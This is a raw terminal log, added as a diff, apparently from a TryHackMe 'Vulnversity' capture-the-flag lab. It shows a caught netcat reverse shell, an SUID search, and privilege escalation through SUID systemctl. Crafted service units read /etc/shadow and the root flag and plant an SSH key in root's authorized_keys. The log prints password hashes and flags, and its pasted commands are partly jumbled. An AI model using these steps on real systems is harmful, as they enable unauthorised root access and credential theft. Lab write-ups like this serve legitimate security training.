@@ -1,0 +1,187 @@
+root@kali:/opt/TryHackMe/vulnversity# nc -lvnp 1234
+listening on [any] 1234 ...
+
+
+connect to [10.8.147.132] from (UNKNOWN) [10.10.102.214] 59710
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 17:37:38 up 48 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ $ $
+$
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ cd /home
+$ ls
+bill
+$ cat /home/bill/user.txt
+8bd7992fbe8a6ad22a63361004cfcedb
+$ find / -type f -perm -u=s 2>/dev/null
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/squid/pinger
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/ntfs-3g
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/systemctl
+/bin/ping
+/bin/fusermount
+/sbin/mount.cifs
+$ sudo vi -c ':!/bin/sh' /dev/null
+sudo: no tty present and no askpass program specified
+$ sudo -l
+sudo: no tty present and no askpass program specified
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@vulnuniversity:/home$ sudo -l
+sudo -l
+[sudo] password for www-data:
+
+Sorry, try again.
+[sudo] password for www-data:
+
+Sorry, try again.
+[sudo] password for www-data: asd
+
+sudo: 3 incorrect password attempts
+www-data@vulnuniversity:/home$ sudo vi -c ':!/bin/sh' /dev/null
+sudo vi -c ':!/bin/sh' /dev/null
+[sudo] password for www-data:
+
+Sorry, try again.
+[sudo] password for www-data:
+
+
+
+
+
+
+
+########################à
+
+
+www-data@vulnuniversity:/var/www/html$ TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output2"
+[Install]
+WantedBy=multi-user.target' > $TFTF=$(mktemp).service
+www-data@vulnuniversity:/var/www/html$ echo '[Service]
+> Type=oneshot
+> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output2"
+> [Install]
+>
+
+
+
+###################################
+
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /etc/shadow > /tmp/output3"
+[Install]
+WantedBy=multi-user.target' > $TF
+
+
+www-data@vulnuniversity:/var/www/html$ /bin/systemctl link $TF
+/bin/systemctl link $TF
+Created symlink from /etc/systemd/system/tmp.808Gnjy31G.service to /tmp/tmp.808Gnjy31G.service.
+www-data@vulnuniversity:/var/www/html$  /bin/systemctl enable --now $TF
+ /bin/systemctl enable --now $TF
+Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.808Gnjy31G.service to /tmp/tmp.808Gnjy31G.service.
+www-data@vulnuniversity:/var/www/html$ cat /tmp/output3
+cat /tmp/output3
+root:$6$VbvnbWCV$F7SSCrKm6JJdUsdcWK3hx47ARJdWvkFuW.JVRfUHSj/od3J34WkMKDJws0558oP0l8Ux2.ZDlpg6KSe5SCoYI0:18109:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+lxd:*:18108:0:99999:7:::
+messagebus:*:18108:0:99999:7:::
+uuidd:*:18108:0:99999:7:::
+dnsmasq:*:18108:0:99999:7:::
+sshd:*:18108:0:99999:7:::
+ftp:*:18109:0:99999:7:::
+bill:$6$0Ab1ttYa$PjLYB5poGT2Hz/pwXwpIKEi3ptJ.UZAqqYGmcCGuzCtnJX9u1aYnkd/6NSH4HS4vbtQUp/pwSXXu.XCsuHHlD/:18109:0:99999:7:::
+
+
+
+########### MY WAY:
+
+www-data@vulnuniversity:/tmp$ TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /tmp/lul > /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys"
+[Install]
+WantedBy=multi-user.target' > $TFTF=$(mktemp).service
+www-data@vulnuniversity:/tmp$ echo '[Service]
+> Type=oneshot
+<horized_keys && chmod 600 /root/.ssh/authorized_keys"
+> [Install]
+>
+WantedBy=multi-user.target' > $TF
+www-data@vulnuniversity:/tmp$ /bin/systemctl link $TF
+/bin/systemctl link $TF
+Created symlink from /etc/systemd/system/tmp.vyJCHWj7Yg.service to /tmp/tmp.vyJCHWj7Yg.service.
+www-data@vulnuniversity:/tmp$ /bin/systemctl enable --now $TF
+/bin/systemctl enable --now $TF
+Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.vyJCHWj7Yg.service to /tmp/tmp.vyJCHWj7Yg.service.
+
+
+
+root@kali:~# ssh -i .ssh/id_rsa 10.10.102.214
+The authenticity of host '10.10.102.214 (10.10.102.214)' can't be established.
+ECDSA key fingerprint is SHA256:5mYwTslxX8/O8sTAOU9ircoh9TjBmEP/Ls7WAxeaIlQ.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.102.214' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+125 packages can be updated.
+86 updates are security updates.
+
+
+Last login: Wed Jul 31 21:53:50 2019 from 192.168.1.130
+root@vulnuniversity:~# cat root.txt
+a58ff8579f0a9270368d33a9966c7fd5
+
